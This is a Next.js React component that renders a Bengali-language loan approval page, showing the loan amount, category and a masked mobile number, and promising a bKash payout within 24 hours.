'use client';
import { useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { useLoan } from '@/context/LoanContext';

export default function LoanSuccess() {
  const router = useRouter();
  const { loanData, clearLoanData } = useLoan();

  useEffect(() => {
    if (!loanData.amount) {
      router.push('/');
    }
  }, [loanData, router]);

  const handleHome = () => {
    clearLoanData();
    router.push('/');
  };

  const maskedMobile = loanData.mobile_number 
    ? loanData.mobile_number.substring(0, 3) + 'XXXX' + loanData.mobile_number.substring(7)
    : '';

  return (
    <div className="bg-gradient-to-br from-pink-50 to-pink-100 min-h-screen flex items-center justify-center p-4">
      <div className="bg-white rounded-3xl shadow-2xl p-8 w-full max-w-md text-center">
        {/* Success Icon */}
        <div className="mb-6">
          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
            </svg>
          </div>
          <h1 className="text-2xl font-bold text-gray-800 mb-2">ঋণ অনুমোদিত!</h1>
          <p className="text-gray-600">আপনার ঋণের আবেদন সফলভাবে অনুমোদিত হয়েছে।</p>
        </div>

        {/* Loan Details */}
        <div className="bg-gray-50 rounded-2xl p-6 mb-6">
          <h2 className="text-lg font-semibold text-gray-800 mb-4">ঋণের বিবরণ</h2>
          <div className="space-y-3 text-left">
            <div className="flex justify-between border-b border-gray-200 pb-1">
              <span className="text-gray-600">পরিমাণ:</span>
              <span className="font-semibold text-pink-600">৳{loanData.amount?.toLocaleString()}</span>
            </div>
            <div className="flex justify-between border-b border-gray-200 pb-1">
              <span className="text-gray-600">ক্যাটেগরি:</span>
              <span className="font-semibold">{loanData.category}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-600">মোবাইল:</span>
              <span className="font-semibold">{maskedMobile}</span>
            </div>
          </div>
        </div>

        {/* Next Steps */}
        <div className="text-left mb-6">
          <h3 className="font-semibold text-gray-800 mb-2">পরবর্তী ধাপ:</h3>
          <ul className="text-sm text-gray-600 space-y-1">
            <li>• আপনার bKash অ্যাকাউন্টে অর্থ পাঠানো হবে</li>
            <li>• SMS এর মাধ্যমে নিশ্চিতকরণ পাবেন</li>
            <li>• ২৪ ঘন্টার মধ্যে অর্থ পৌঁছাবে</li>
          </ul>
        </div>

        {/* Action Button */}
        <button 
          onClick={handleHome}
          className="w-full bg-pink-600 text-white py-3 px-6 rounded-2xl font-semibold hover:bg-pink-700 transition-colors"
        >
          হোম পেজে ফিরে যান
        </button>
      </div>
    </div>
  );
}
